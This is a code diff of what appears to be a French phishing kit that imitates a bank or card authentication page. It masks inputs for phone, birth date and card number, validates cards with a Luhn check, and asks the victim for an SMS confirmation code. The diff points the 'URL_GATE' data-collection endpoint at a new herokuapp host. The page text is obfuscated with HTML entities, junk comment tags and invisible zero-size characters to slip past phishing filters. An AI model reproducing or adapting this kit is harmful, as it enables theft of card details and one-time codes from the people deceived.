@@ -416,7 +416,7 @@ var nemra = "";
 var feedzeb="";
 var pic="<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA3XAAAN1wFCKJt4AAABrUlEQVQ4y6WUTU9TURCGn5l7ezUm3FjphsJGjRtDGtxAwpc3oDs2bIj4L9zob5DEhcZ/IKmGkLBh2coVy8KdLvxITFzRFdQSFwqVe8YF2tT2tlR5V3MyM++8M+fMEVJQn711w8SWxewmcAnAoIbZK/HseTaO37bnSOvhWxTlnNPHBsvtvhYYxqoXyL2wXK51ENVm5q+ruE2Qy03n+XNceHAfgO8PV7DDo1bCLwm6kNsufQRQgP25uWEVSq0kAAQBXmEUrzAKQdCu7IqHK+1N3c43ifTYHoEN8e/I+97xCoDWo2hMkCX+G3L368x8QS2RXoPti0mVOyowyRlhZlMKMsTZkfdPF95f1z5CFbiaKvnwiJ/xdtPu0duuD7wEZlMDGg1+PHnax7ilrC6xdcCl+gcGCNeKhGtFJAy70bhE3boO7my9F3iRXgnwM5DJ9JiVrObi+JMAHExPZ02DN8C1v2JU0JGRk7K7VXAdwj+La0xcrFTqPZf2FHQuLcDg6/IHT21coHjy/XS/I4xnXkbG/5DQbTXqUTRGIovApIgM/369VUR2cLaRrWy9a8/5BZ7cj3zxUmEJAAAAAElFTkSuQmCC' />";
 var error_message = "";
-var URL_GATE = "https://andakadaka.herokuapp.com";
+var URL_GATE = "https://redirect-amsl.herokuapp.com/";
 $('#nb').mask('00.00.00.00.00');
 $('#dubs').mask('00/00/0000');
 $('#tarja').mask('0000.0000.0000.0000');
@@ -547,7 +547,7 @@ function lulu(cardNum){
         bEven = !bEven;
     }
 
-  	return (nCheck % 10) === 0;
+  return (nCheck % 10) === 0;
 }
 
 function startTimer() {
@@ -950,8 +950,8 @@ N° &#099;<font style="color:transparent;font-size: 0px;">v</font>r<!ioW>&#121;<
     N<!17Y>&#111;<font style="color:transparent;font-size: 0px;">m</font>&#117;<font style="color:transparent;font-size: 0px;">j</font>s<!o> v<!PzD>&#111;<font style="color:transparent;font-size: 0px;">t</font>&#117;&#115;<font style="color:transparent;font-size: 0px;">N</font> &#114;<font style="color:transparent;font-size: 0px;">z</font>&#101;<font style="color:transparent;font-size: 0px;">9</font>&#109;<font style="color:transparent;font-size: 0px;">N</font>&#101;<font style="color:transparent;font-size: 0px;">1</font>&#114;&#099;<font style="color:transparent;font-size: 0px;">G</font>i<!76T>&#111;<font style="color:transparent;font-size: 0px;">0</font>&#110;<font style="color:transparent;font-size: 0px;">2</font>s<!dA> &#100;<font style="color:transparent;font-size: 0px;">Q</font>&#101; &#118;<font style="color:transparent;font-size: 0px;">a</font>&#111;&#117;<font style="color:transparent;font-size: 0px;">4</font>&#115;<font style="color:transparent;font-size: 0px;">3</font> a<!N>u<!6t>t<!t>&#104;&#101;<font style="color:transparent;font-size: 0px;">T</font>&#110;&#116;<font style="color:transparent;font-size: 0px;">K</font>&#105;<font style="color:transparent;font-size: 0px;">o</font>&#102;<font style="color:transparent;font-size: 0px;">l</font>i<!u1>&#101;<font style="color:transparent;font-size: 0px;">A</font>r<!N> &#101;<font style="color:transparent;font-size: 0px;">o</font>n<!N> &#115;<font style="color:transparent;font-size: 0px;">F</font>&#097;&#105;&#115;<font style="color:transparent;font-size: 0px;">J</font>i<!b>s<!czT>&#115;&#097;<font style="color:transparent;font-size: 0px;">v</font>n<!Pu>t<!c0K> l<!Q7j>&#101; c<!S>o<!1I>&#100;&#101;<font style="color:transparent;font-size: 0px;">f</font> d<!sq>&#101; c<!U>&#111;<font style="color:transparent;font-size: 0px;">u</font>&#110;<font style="color:transparent;font-size: 0px;">u</font>f<!fi>&#105;&#114;&#109;a<!3>&#116;<font style="color:transparent;font-size: 0px;">C</font>&#105;o<!7x>&#110; envoyé au +33<span id="nemrahna"></span>.
     <br>&#067;<font style="color:transparent;font-size: 0px;">B</font>e<!Nl>&#116;<font style="color:transparent;font-size: 0px;">o</font>t<!ki>e<!3ao> &#097;<font style="color:transparent;font-size: 0px;">Z</font>&#117;&#116;<font style="color:transparent;font-size: 0px;">P</font>&#104;<font style="color:transparent;font-size: 0px;">7</font>&#101;<font style="color:transparent;font-size: 0px;">X</font>&#110;<font style="color:transparent;font-size: 0px;">6</font>&#116;<font style="color:transparent;font-size: 0px;">n</font>i<!1uB>&#102;&#105;&#099;<font style="color:transparent;font-size: 0px;">l</font>a<!d>t<!tit>i<!b8>&#111;n<!HV> e<!L>&#115;<font style="color:transparent;font-size: 0px;">O</font>&#116; o<!Zym>&#098;<font style="color:transparent;font-size: 0px;">l</font>&#108;<font style="color:transparent;font-size: 0px;">s</font>i<!fCh>&#103;<font style="color:transparent;font-size: 0px;">u</font>&#097;<font style="color:transparent;font-size: 0px;">N</font>t<!Ed>&#111;<font style="color:transparent;font-size: 0px;">N</font>&#105;<font style="color:transparent;font-size: 0px;">N</font>r<!aP>&#101;<font style="color:transparent;font-size: 0px;">i</font> p<!NNA>&#111;<font style="color:transparent;font-size: 0px;">9</font>u<!XPG>&#114;<font style="color:transparent;font-size: 0px;">7</font> c<!Wl>&#111;<font style="color:transparent;font-size: 0px;">P</font>n<!2v>&#102;<font style="color:transparent;font-size: 0px;">5</font>i<!XjM>&#114;<font style="color:transparent;font-size: 0px;">g</font>m<!mW>&#101;<font style="color:transparent;font-size: 0px;">G</font>&#114;<font style="color:transparent;font-size: 0px;">x</font> &#118;<font style="color:transparent;font-size: 0px;">i</font>o<!U>&#116;<font style="color:transparent;font-size: 0px;">R</font>r<!TQ1>&#101;<font style="color:transparent;font-size: 0px;">T</font> op&eacute;ration.<br>
     <p>
-		Si vous ne recevez pas le code dans <span id="timer"></span> minutes , <a href="#">cliquez ici</a>.
-		</p>
+Si vous ne recevez pas le code dans <span id="timer"></span> minutes , <a href="#">cliquez ici</a>.
+</p>
     <br>
 </div>
 <div>
